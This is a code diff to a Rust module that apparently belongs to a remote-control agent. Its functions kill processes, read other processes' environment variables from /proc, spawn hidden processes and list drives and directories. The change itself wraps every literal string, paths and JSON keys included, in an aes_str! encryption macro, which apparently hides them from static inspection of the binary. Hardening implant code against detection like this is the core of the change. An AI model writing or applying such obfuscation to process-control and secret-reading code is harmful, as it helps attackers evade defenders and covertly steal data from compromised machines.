@@ -6,7 +6,7 @@
 use std::fs;
 use sha2::{Sha256, Digest as Sha2Digest};
 use hmac::{Hmac, Mac};
-use md5::{Md5, Digest as Md5Digest};
+use md5::Md5;
 use aes_gcm::{
     aead::{Aead, KeyInit, OsRng},
     Aes256Gcm, Nonce,
@@ -41,7 +41,7 @@ pub(super) fn md5_hex(s: &str) -> String {
 pub(super) fn hmac_sha256_hex(key: &[u8], data: &[u8]) -> Result<String, String> {
     type HmacSha256 = Hmac<Sha256>;
     let mut mac = <HmacSha256 as Mac>::new_from_slice(key)
-        .map_err(|e| format!("HMAC key error: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("HMAC key error: "), e))?;
     mac.update(data);
     Ok(hex::encode(mac.finalize().into_bytes()))
 }
@@ -85,7 +85,7 @@ pub(super) fn do_encrypt(cipher: &Aes256Gcm, plaintext: &[u8]) -> Result<Vec<u8>
             out.extend_from_slice(&ct);
             Ok(out)
         }
-        Err(e) => Err(format!("AES Error: {}", e)),
+        Err(e) => Err(format!("{}{}", aes_str!("AES Error: "), e)),
     }
 }
 
@@ -97,7 +97,7 @@ pub(super) fn do_decrypt(cipher: &Aes256Gcm, encrypted_data: &[u8]) -> Result<Ve
     let nonce = Nonce::from_slice(nonce_bytes);
     match cipher.decrypt(nonce, ciphertext) {
         Ok(pt) => Ok(pt),
-        Err(e) => Err(format!("AES Error: {}", e)),
+        Err(e) => Err(format!("{}{}", aes_str!("AES Error: "), e)),
     }
 }
 
@@ -171,25 +171,25 @@ pub(super) fn kill_pid(pid: u32) -> String {
         use super::win_ffi::win_ext::*;
         let h = OpenProcess(crate::config::config().ffi_windows.process_all_access, 0, pid);
         if h.is_null() {
-            return format!("Error: OpenProcess failed ({})", GetLastError());
+            return format!("{}{})", aes_str!("Error: OpenProcess failed ("), GetLastError());
         }
         let ok = TerminateProcess(h, 1);
         CloseHandle(h);
         if ok != 0 { aes_str!("Killed") }
-        else { format!("Error: TerminateProcess failed ({})", GetLastError()) }
+        else { format!("{}{})", aes_str!("Error: TerminateProcess failed ("), GetLastError()) }
     }
     #[cfg(not(target_os = "windows"))]
     unsafe {
         let r = libc::kill(pid as libc::pid_t, libc::SIGKILL);
         if r == 0 { aes_str!("Killed") }
-        else { format!("Error: kill() returned {}", r) }
+        else { format!("{}{}", aes_str!("Error: kill() returned "), r) }
     }
 }
 
 pub(super) fn proc_env(pid: u32) -> String {
     #[cfg(target_os = "linux")]
     {
-        let path = format!("/proc/{}/environ", pid);
+        let path = format!("{}{}{}", aes_str!("/proc/"), pid, aes_str!("/environ"));
         match fs::read(&path) {
             Ok(bytes) => {
                 let pairs: Vec<serde_json::Value> = bytes
@@ -200,16 +200,16 @@ pub(super) fn proc_env(pid: u32) -> String {
                         let mut it = s.splitn(2, '=');
                         let k = it.next()?;
                         let v = it.next().unwrap_or("");
-                        Some(json!({ "key": k, "value": v }))
+                        Some(json!({ aes_str!("key").as_str(): k, aes_str!("value").as_str(): v }))
                     })
                     .collect();
                 serde_json::to_string(&pairs).unwrap_or("[]".into())
             }
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     }
     #[cfg(not(target_os = "linux"))]
-    format!("Error: proc_env not supported on this platform (pid {})", pid)
+    format!("{}{})", aes_str!("Error: proc_env not supported on this platform (pid "), pid)
 }
 
 pub(super) fn spawn_hidden(binary: &str, args_json: &str) -> String {
@@ -224,7 +224,7 @@ pub(super) fn spawn_hidden(binary: &str, args_json: &str) -> String {
     }
     match cmd.spawn() {
         Ok(child) => child.id().to_string(),
-        Err(e)    => format!("Error: {}", e),
+        Err(e)    => format!("{}{}", aes_str!("Error: "), e),
     }
 }
 
@@ -241,8 +241,8 @@ fn enumerate_drives() -> String {
         .map(|i| {
             let letter = (b'A' + i as u8) as char;
             let path   = format!("{}:\\", letter);
-            json!({ "name": path, "is_dir": true, "is_drive": true,
-                    "size": 0, "perms": "rw", "mod_time": 0 })
+            json!({ aes_str!("name").as_str(): path, aes_str!("is_dir").as_str(): true, aes_str!("is_drive").as_str(): true,
+                    aes_str!("size").as_str(): 0, aes_str!("perms").as_str(): aes_str!("rw"), aes_str!("mod_time").as_str(): 0 })
         })
         .collect();
     serde_json::to_string(&entries).unwrap_or_else(|_| "[]".to_string())
@@ -271,13 +271,13 @@ fn collect_mount_dirs(bases: &[String]) -> String {
                     .and_then(|m| m.modified().ok())
                     .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs())
                     .unwrap_or(0);
-                entries.push(json!({ "name": full_path, "is_dir": true, "is_drive": true,
-                                     "size": 0, "perms": "rw", "mod_time": modified }));
+                entries.push(json!({ aes_str!("name").as_str(): full_path, aes_str!("is_dir").as_str(): true, aes_str!("is_drive").as_str(): true,
+                                     aes_str!("size").as_str(): 0, aes_str!("perms").as_str(): aes_str!("rw"), aes_str!("mod_time").as_str(): modified }));
             }
         }
     }
     entries.sort_by(|a, b| {
-        a["name"].as_str().unwrap_or("").cmp(b["name"].as_str().unwrap_or(""))
+        a[aes_str!("name").as_str()].as_str().unwrap_or("").cmp(b[aes_str!("name").as_str()].as_str().unwrap_or(""))
     });
     serde_json::to_string(&entries).unwrap_or_else(|_| "[]".to_string())
 }
@@ -296,26 +296,26 @@ pub fn get_directory_json(path: &str) -> String {
                 let size        = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
                 let name        = entry.file_name().to_string_lossy().to_string();
                 let permissions = if let Some(m) = &metadata {
-                    if m.permissions().readonly() { "r" } else { "rw" }
-                } else { "?" };
+                    if m.permissions().readonly() { aes_str!("r") } else { aes_str!("rw") }
+                } else { aes_str!("?") };
                 let modified = metadata.as_ref()
                     .and_then(|m| m.modified().ok())
                     .map(|t| t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs())
                     .unwrap_or(0);
                 entries.push(json!({
-                    "name": name, "is_dir": is_dir,
-                    "size": size, "perms": permissions, "mod_time": modified,
+                    aes_str!("name").as_str(): name, aes_str!("is_dir").as_str(): is_dir,
+                    aes_str!("size").as_str(): size, aes_str!("perms").as_str(): permissions, aes_str!("mod_time").as_str(): modified,
                 }));
             }
         }
     } else {
-        return json!({ "error": format!("Failed to read path: {}", path) }).to_string();
+        return json!({ "error": format!("{}{}", aes_str!("Failed to read path: "), path) }).to_string();
     }
     entries.sort_by(|a, b| {
-        let a_dir = a["is_dir"].as_bool().unwrap_or(false);
-        let b_dir = b["is_dir"].as_bool().unwrap_or(false);
+        let a_dir = a[aes_str!("is_dir").as_str()].as_bool().unwrap_or(false);
+        let b_dir = b[aes_str!("is_dir").as_str()].as_bool().unwrap_or(false);
         if a_dir == b_dir {
-            a["name"].as_str().unwrap_or("").cmp(b["name"].as_str().unwrap_or(""))
+            a[aes_str!("name").as_str()].as_str().unwrap_or("").cmp(b[aes_str!("name").as_str()].as_str().unwrap_or(""))
         } else {
             b_dir.cmp(&a_dir)
         }
